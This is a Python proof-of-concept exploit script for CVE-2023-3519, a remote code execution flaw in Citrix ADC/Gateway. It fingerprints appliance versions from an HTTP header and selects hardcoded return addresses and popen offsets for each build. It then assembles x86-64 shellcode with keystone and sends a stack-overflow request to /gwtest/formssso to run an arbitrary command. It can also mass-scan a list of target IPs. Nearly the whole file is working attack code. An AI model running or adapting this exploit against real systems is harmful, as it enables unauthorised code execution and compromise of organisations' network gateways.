##################################################################################################
# Description: Citrix ADC/Gateway RCE - CVE-2023-3519
# Author: b0yd - @rwincey - www.securifera.com
#
# Usage: python citrix_poc.py -t  192.168.241.233 -c "/sbin/ifconfig > /var/netscaler/logon/b.txt"
#
##################################################################################################


import struct
import socket
import ssl
import requests
import urllib3
import argparse
import netaddr

from multiprocessing.pool import ThreadPool
from datetime import datetime, timezone
from tqdm import tqdm
from keystone import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def convert_time_stamp(time_stamp_str):
    # Define the date format
    time_format = "%a, %d %b %Y %H:%M:%S %Z"

    # Convert the string into a datetime object
    time_obj = datetime.strptime(time_stamp_str, time_format)

    return time_obj

def get_last_modified_header(url):
    try:
        response = requests.get(url, verify=False)
        last_modified = response.headers.get('Last-Modified')
        return last_modified
    except requests.exceptions.RequestException as err:
        print ("[-] HTTP Request failed", err)
        return None

# Specify the host and the port number
def connect_send(host, port, payload):

    # Create a raw socket
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Wrap the raw socket with SSL
    ssl_socket = ssl.wrap_socket(raw_socket)

    # Connect to the server
    ssl_socket.connect((host, port))

    # Construct the HTTP request
    http_request_pre = "GET /gwtest/formssso?event=start&target="
    http_request_post = " HTTP/1.1\r\nHost: %s\r\n\r\n" % (host)
    
    http_request = http_request_pre.encode()
    http_request += payload
    http_request += http_request_post.encode()
    

    # Send the HTTP request
    ssl_socket.send(http_request)

    # Get the response
    response = ssl_socket.recv(4096)

    # Print the response
    if len(response) > 0:
        print(response.decode())
        print()
    else:
        print("[-] No response")

    # Close the socket
    ssl_socket.close()


def encode_buffer(shellcode):
    buffer = bytearray()
    for b in bytearray(shellcode):
        #print(b)
        if b < 0xa0:
            buffer.extend(('%{:02X}'.format(b)).encode())
        else:
            buffer.append(b)
    return buffer
    
def replace_cmd(bytecode, cmd, buf_size):

    if len(cmd) > buf_size:
        print("[-] Command too long for current payload template. Aborting")
        return
        
    # Replace nop place holders
    find_bytes = b'\x90\x90\x90\x90\xcc\xcc\xcc\xcc'
    haystack = bytes(bytecode)
    needle = bytes(find_bytes)
    # print("Len before: %d" % len(haystack))
    # print(haystack)

    read_str = b'%s\x00' % cmd.encode()
    
    idx = haystack.find(needle)
    ret_bytes = haystack[:idx]
    ret_bytes += read_str
    ret_bytes += (buf_size - len(read_str)) * b'\x00'
    ret_bytes += haystack[idx + buf_size:]
    
    # print("Len after: %d" % len(ret_bytes))
    # print(ret_bytes)
    
    return bytearray(ret_bytes)

def replace_popen(bytecode):

    buf_size = 8
    
    # Replace nop place holders
    find_bytes = b'\x90\x90\x90\xcc\xcc\xcc\xcc\xcc'
    haystack = bytes(bytecode)
    needle = bytes(find_bytes)
    # print("Len before: %d" % len(haystack))
    # print(haystack)

    read_str = b'r\x00\x00\x00\x00\x00\x00\x00'
    
    idx = haystack.find(needle)
    ret_bytes = haystack[:idx]
    ret_bytes += read_str
    ret_bytes += haystack[idx + buf_size:]
    
    # print("Len after: %d" % len(ret_bytes))
    # print(ret_bytes)
    
    return bytearray(ret_bytes)
  

def assemble_payload( cmd, timestamp ):

    return_offset = 168
    
    fixup_rbp = 0
    
    if timestamp == 1668679107:
        print("[-] Server is vulnerable: 13.0-88.16")
        # Wed, 17 Nov 2022 09:58:27 GMT
        fixup_return = 0x84f7e2 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x12e0
        # in this version the epilogue of ns_aaa_cookie_valid reads directly from rbp and since the exploit
        # clobbers it, the value needs to be restored and can't be done using relative adjustment like rsp
        fixup_rbp = 0x190
        popen = 0x01f3b580
        return_addr = 0x4d3b13 # jmp rsp
        
    elif timestamp == 1671030909:
        print("[-] Server is vulnerable: 13.0-89.7")
        # Wed, 14 Dec 2022 15:15:09 GMT
        fixup_return = 0x84fd22 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x12e0
        # in this version the epilogue of ns_aaa_cookie_valid reads directly from rbp and since the exploit
        # clobbers it, the value needs to be restored and can't be done using relative adjustment like rsp
        fixup_rbp = 0x190
        popen = 0x01f3c580
        return_addr = 0x4837ac # jmp rsp
        
    elif timestamp == 1681917006:
        print("[-] Server is vulnerable: 13.0-90.11")
        # Wed, 19 Apr 2023 15:10:06 GMT
        fixup_return = 0x850a12 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x12e0
        # in this version the epilogue of ns_aaa_cookie_valid reads directly from rbp and since the exploit
        # clobbers it, the value needs to be restored and can't be done using relative adjustment like rsp
        fixup_rbp = 0x190
        popen = 0x01f3f000
        return_addr = 0x4fad8d # jmp rsp
        
    elif timestamp == 1684144411:
        print("[-] Server is vulnerable: 13.0-90.12")
        # Mon, 15 May 2023 09:53:31 GMT
        fixup_return = 0x850a12 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x12e0
        # in this version the epilogue of ns_aaa_cookie_valid reads directly from rbp and since the exploit
        # clobbers it, the value needs to be restored and can't be done using relative adjustment like rsp
        fixup_rbp = 0x190
        popen = 0x01f3f000
        return_addr = 0x4fad8d # jmp rsp
        
    elif timestamp == 1649309802:    
        print("[-] Server is vulnerable: 13.1-21.50")
        # Thu, 07 Apr 2022 05:36:42 GMT
        #fixup_return = 0x77e085 # ns_aaa_cookie_valid
        fixup_return = 0x78c7e4 # ns_aaa_client_hander
        #fixup_stack_adjustment = 0x13d0
        fixup_stack_adjustment = 0x1518
        popen = 0x1d35460
        return_addr = 0x6da6c0 # jmp rsp
        
    elif timestamp == 1669199920:    
        print("[-] Server is vulnerable: 13.1-37.38")
        # Wed, 23 Nov 2022 10:38:40 GMT
        fixup_return = 0x77c324 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1d7e320
        return_addr = 0x15d131d # jmp rsp
        
    elif timestamp == 1677070188:
        print("[-] Server is vulnerable: 13.1-42.47")
        #Wed, 22 Feb 2023 12:49:48 GMT
        fixup_return = 0x7807c2 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1d7e5d0
        return_addr = 0x50fb5e # jmp rsps  

    elif timestamp ==1681284252:
        print("[-] Server is vulnerable: 13.1-45.61")
        #Wed, 12 Apr 2023 07:24:12 GMT
        fixup_return = 0x78115f # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1d80a40
        return_addr = 0x772c55    

    elif timestamp ==1682842299:
        print("[-] Server is vulnerable: 13.1-45.63")
        # Sun, 30 Apr 2023 08:11:39 GMT
        fixup_return = 0x78114f # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1d80940
        return_addr = 0x772c45    
    
    elif timestamp == 1683874152:
        print("[-] Server is vulnerable: 13.1-45.64")
        # Fri, 12 May 2023 06:49:12 GMT
        fixup_return = 0x78114f # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1d80940
        return_addr = 0x772c45    
                
    elif timestamp == 1685774354:
        print("[-] Server is vulnerable: 13.1-48.47")
        # Sat, 03 Jun 2023 06:39:14 GMT
        fixup_return = 0x782403 # ns_aaa_cookie_valid
        fixup_stack_adjustment = 0x13a8
        popen = 0x1da6340
        return_addr = 0x611ae9 # jmp rsp 
       
    elif timestamp == 1689010877:
        # Mon, 10 Jul 2023 17:41:17 GMT
        print("[-] Server is not vulnerable: 13.1-49.13")
        return None
    elif timestamp == 1688744380:
        # Fri, 07 Jul 2023 15:39:40 GMT
        print("[-] Server is not vulnerable: 13.0-91.13")
        return None
    elif timestamp < 1688744380:
        print("[-] Server is vulnerable: Unknown version")
        return None
    elif timestamp >= 1688744380:
        print("[-] Server is likely not vulnerable: Unknown version")
        return None
    else:
        print("[-] Unknown version")
        return None
            
    fixup_rbp_inst = ''
    if fixup_rbp > 0:
        fixup_rbp_inst = 'mov rbp, rsp\nadd rbp, %s' % str(fixup_rbp)
    
    shellcode = ''
    payload_size = 80
    nop_slide = 'nop\n' * payload_size
    asm_code = '''
      call loc_popen_arg1
        nop
        nop
        nop
        nop
        int3
        int3
        int3
        int3
        %s
      loc_popen_arg1:
        pop  rdi

      call loc_popen_arg2
        nop
        nop
        nop
        int3
        int3
        int3
        int3
        int3
      loc_popen_arg2:
        pop rsi

        mov  rax, %s
        sub  rsp, 0x200
        call rax

      loc_return:
        xor rax, rax
        add rsp, %s
        %s
        push     %s
        ret
    ''' % (nop_slide, str(popen), str(fixup_stack_adjustment + 0x200), fixup_rbp_inst, str(fixup_return))

    # Assemble the code
    #print(asm_code)
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    bytecode, count = ks.asm(asm_code)

    # Print the resulting bytecode
    #print(bytecode)

    # Replace nops with data strings
    bytecode = replace_popen(bytecode)
    #print(bytecode)

    bytecode = replace_cmd(bytecode, cmd, payload_size + 8)
    #print(bytecode)

    buffer = b'A' * return_offset
    buffer += struct.pack('Q', return_addr)
    buffer += encode_buffer(bytecode)
    return buffer
    
def scan(host, port, cmd, exploit=False):
    url = "https://%s:%s/logon/LogonPoint/init.js" % (host, port)
    hdr = get_last_modified_header(url)
    if hdr:
        print("\n[*] %s:%d - %s " % (host,port, hdr))  
        time_stamp = convert_time_stamp(hdr)
        last_modified = int(time_stamp.replace(tzinfo=timezone.utc).timestamp())
        #print(last_modified)
        
        # Check exploit flag
        buffer = assemble_payload(cmd, last_modified)
        if buffer and exploit == True:
            connect_send(host, port, buffer)
    
if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help = "Target IP")
    parser.add_argument("-f", "--file", help = "Target IP File Path")
    parser.add_argument("-p", "--port", help = "Target port", default = 443)
    parser.add_argument("-c", "--cmd", help = "Command to run")
    parser.add_argument("-w", "--workers", help = "Number of thread pool workers", default = 10)
    parser.add_argument('--exploit', dest='exploit', action='store_true')
    args = parser.parse_args()

    host = args.target
    port = int(args.port)
    cmd = args.cmd
    exploit = args.exploit

    host_arr = set()
    if args.file:
        f = open(args.file)
        lines =f.readlines()
        f.close()

        for line in lines:
            try:
                ip = netaddr.IPAddress(line)
                host_arr.add(str(ip))
            except:
                pass
    else:
        host_arr.add(host)

    if len(host_arr) > 0:
        
        thread_list = []
        pool = ThreadPool(processes=int(args.workers))
        for host_inst in host_arr:
            thread_list.append(pool.apply_async(scan, (host_inst, port,cmd, exploit)))

        # Close the pool
        pool.close()
        
        # Loop through thread function calls and update progress
        for thread_obj in tqdm(thread_list):
            thread_obj.get()

    else:
        print("[-] No targets specified.")
